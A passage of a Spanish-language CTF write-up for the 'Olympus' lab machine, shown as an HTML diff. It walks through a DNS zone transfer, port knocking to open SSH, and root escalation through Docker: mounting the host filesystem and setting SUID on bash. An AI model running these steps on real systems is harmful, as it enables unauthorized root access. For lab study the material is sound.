+<p>El tito nos vuelve a decir que es muy importante no confundir la arremienta dig con dick. Dig esta en
+la categoria Sciencia y Technologia y la otra en la categoria HotTub ;)</p>
+<div class="sourceCode" id="cb32"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb32-1"><a href="olympus.html#cb32-1"></a><span class="ex">dig</span> @10.10.10.83 ctfolympus.htb</span></code></pre></div>
+<p>Como <strong>dig</strong> nos responde, ya podemos ir enumerando cosas</p>
+<ol style="list-style-type: decimal">
+<li><p>Enumerar los mail servers</p>
+<div class="sourceCode" id="cb33"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb33-1"><a href="olympus.html#cb33-1"></a><span class="ex">dig</span> @10.10.10.83 ctfolympus.htb mx</span></code></pre></div></li>
+<li><p>Intentamos un attacke axfr</p>
+<div class="sourceCode" id="cb34"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb34-1"><a href="olympus.html#cb34-1"></a><span class="ex">dig</span> @10.10.10.83 ctfolympus.htb axfr</span></code></pre></div>
+<div class="figure"><span id="fig:unnamed-chunk-4"></span>
+<img src="images/dig-ctfolympus.png" alt="dig ctfolympus.htb" width="90%" />
+<p class="caption">
+Figure 3: dig ctfolympus.htb
+</p>
+</div></li>
+</ol>
+<p>Se puede ver que hay un usuario y una contraseña potencial en un TXT con una lista de puertos.
+La idea aqui seria de hacer un <strong>Port Knocking</strong></p>
+</div>
+</div>
+<div id="port-knocking" class="section level3 unnumbered">
+<h3>Port Knocking</h3>
+<p>En este caso la idea seria connectarse al puerto 22 (es una supposicion). El problema es que este puerto esta cerrado.
+La idea de la technica de <strong>Port Knocking</strong> es que si el attackante golpea unos puertos en un orden definido, por
+iptables se puede exponer o bloquear un puerto.</p>
+<div class="sourceCode" id="cb35"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb35-1"><a href="olympus.html#cb35-1"></a><span class="fu">nmap</span> -p3456,8234,62431,22 --open -T5 -v -n 10.10.10.83 -r</span></code></pre></div>
+<blockquote>
+<p>[!] NOTAS: El argumento <code>-r</code> es para decir a NMAP de scannear los puertos en este mismo orden</p>
+</blockquote>
+<p>Lanzando el commando multiples veces, NMAP nos reporta ahora quel puerto 22 esta ya habierto.
+Lo que se puede hacer es, de seguida despues del <strong>Port Knocking</strong> con nmap, lanzar un commando
+ssh a la maquina.</p>
+<div class="sourceCode" id="cb36"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb36-1"><a href="olympus.html#cb36-1"></a><span class="fu">nmap</span> -p3456,8234,62431,22 --open -T5 -v -n 10.10.10.83 -r <span class="kw">&amp;&amp;</span> <span class="fu">ssh</span> prometheus@10.10.10.83</span></code></pre></div>
+<p>Perfecto se nos pregunta por una contraseña <strong>Y PA DENTRO</strong></p>
+<p>En este momento ya se puede ver la flag <code>user.txt</code> y Podemos passar a la phase de escalacion de privilegios.</p>
+
+</div>
+</div>
+<div id="privilege-escalation" class="section level2 unnumbered">
+<h2>Privilege Escalation</h2>
+<div id="enumeracion-del-usuario-en-la-maquina-victima" class="section level3 unnumbered">
+<h3>Enumeracion del usuario en la maquina victima</h3>
+<div class="sourceCode" id="cb37"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb37-1"><a href="olympus.html#cb37-1"></a><span class="fu">whoami</span></span>
+<span id="cb37-2"><a href="olympus.html#cb37-2"></a><span class="fu">id</span></span></code></pre></div>
+<p>Ya es sufficiente aqui porque ya se puede ver quel usuario esta en el grupo Docker.</p>
+</div>
+<div id="escalacion-de-privilegios-con-docker" class="section level3 unnumbered">
+<h3>Escalacion de privilegios con Docker</h3>
+<ol style="list-style-type: decimal">
+<li><p>Checkear las imagenes Docker existentes</p>
+<div class="sourceCode" id="cb38"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb38-1"><a href="olympus.html#cb38-1"></a><span class="ex">docker</span> ps</span></code></pre></div></li>
+<li><p>Utilizar una imagen existente para crear un contenedor y <strong>mountarle</strong> la raiz del systema en el contenedor</p>
+<div class="sourceCode" id="cb39"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb39-1"><a href="olympus.html#cb39-1"></a><span class="ex">docker</span> run --rm -it -v /:/mnt rodhes bash</span>
+<span id="cb39-2"><a href="olympus.html#cb39-2"></a><span class="bu">cd</span> /mnt/root/</span>
+<span id="cb39-3"><a href="olympus.html#cb39-3"></a><span class="fu">cat</span> root.txt</span></code></pre></div></li>
+<li><p>Escalar privilegios en la maquina real</p>
+<ul>
+<li><p>en el contenedor</p>
+<div class="sourceCode" id="cb40"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb40-1"><a href="olympus.html#cb40-1"></a><span class="bu">cd</span> /mnt/bin</span>
+<span id="cb40-2"><a href="olympus.html#cb40-2"></a><span class="fu">chmod</span> 4755 bash</span>
+<span id="cb40-3"><a href="olympus.html#cb40-3"></a><span class="bu">exit</span></span></code></pre></div></li>
+<li><p>en la maquina real</p>
+<div class="sourceCode" id="cb41"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb41-1"><a href="olympus.html#cb41-1"></a><span class="fu">bash</span> -p</span>
+<span id="cb41-2"><a href="olympus.html#cb41-2"></a><span class="fu">whoami</span></span>
+<span id="cb41-3"><a href="olympus.html#cb41-3"></a></span>
+<span id="cb41-4"><a href="olympus.html#cb41-4"></a><span class="co">#Output</span></span>
+<span id="cb41-5"><a href="olympus.html#cb41-5"></a><span class="ex">root</span></span></code></pre></div></li>
+</ul></li>
+</ol>
+
+</div>
+</div>
+</div>
+<div class="page-inner">
+    <section class="normal" id="section-">
+        <div class="copyright">
+          &copy; 2021 - Lo0pInG 404 <a href="https://michellopez.org">[michellopez.org]</a>
+        </div>
+    </section>
+</div>
+            </section>
+
+          </div>
+        </div>
+      </div>
+<a href="index.html" class="navigation navigation-prev navigation-unique" aria-label="Previous page"><i class="fa fa-angle-left"></i></a>
+
+    </div>
+  </div>
+<script src="libs/gitbook-2.6.7/js/app.min.js"></script>
+<script src="libs/gitbook-2.6.7/js/lunr.js"></script>
+<script src="libs/gitbook-2.6.7/js/clipboard.min.js"></script>
+<script src="libs/gitbook-2.6.7/js/plugin-search.js"></script>
+<script src="libs/gitbook-2.6.7/js/plugin-sharing.js"></script>
+<script src="libs/gitbook-2.6.7/js/plugin-fontsettings.js"></script>
+<script src="libs/gitbook-2.6.7/js/plugin-bookdown.js"></script>
+<script src="libs/gitbook-2.6.7/js/jquery.highlight.js"></script>
+<script src="libs/gitbook-2.6.7/js/plugin-clipboard.js"></script>
+<script>
+gitbook.require(["gitbook"], function(gitbook) {
+gitbook.start({
+"sharing": false,
+"fontsettings": {
+"theme": "night",
+"family": "sans",
+"size": 2
+},
+"edit": {
+"link": "https://github.com/mlopez66/hacking-notes/edit/master/01-Olympus/01-00-Information.Rmd",
+"text": "Edit"
+},
+"history": {
+"link": null,
+"text": null
+},
+"view": {
+"link": null,
+"text": null
+},
+"download": ["2021-S4viNotes.pdf"],
+"toc": {
+"collapse": "section",
+"scroll_highlight": true
+}
+});
+});
+</script>
+
+</body>
+
+</html>
